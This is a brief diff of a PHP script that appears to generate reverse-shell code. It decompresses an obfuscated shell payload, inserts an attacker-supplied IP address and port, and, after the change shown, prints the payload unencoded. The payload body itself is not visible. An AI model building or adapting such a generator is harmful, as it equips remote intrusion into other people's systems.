@@ -8,8 +8,8 @@ if ($ip && $port) {
     $shell_code = gzinflate(base64_decode($shell_code));
     $shell_code = str_replace('__IP__', "'$ip'", $shell_code);
     $shell_code = str_replace('__PORT__', $port, $shell_code);
-    $shell_code = base64_encode(gzdeflate($shell_code, 9));
     echo $shell_code;
+    $shell_code = base64_encode(gzdeflate($shell_code, 9));
 }
 else {
     echo "ERROR: IP_ADDRESS and PORT is required!";
